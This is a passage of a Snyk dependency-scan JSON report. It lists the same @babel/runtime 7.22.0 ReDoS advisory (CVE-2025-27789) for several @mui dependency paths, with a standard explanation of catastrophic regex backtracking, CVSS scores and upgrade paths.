        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@mui/system@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@mui/system@5.13.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "@mui/system@5.18.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/styles@5.13.2",
          "@mui/private-theming@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "@mui/private-theming@5.17.1",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.13.2",
          "react-transition-group@4.4.5",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
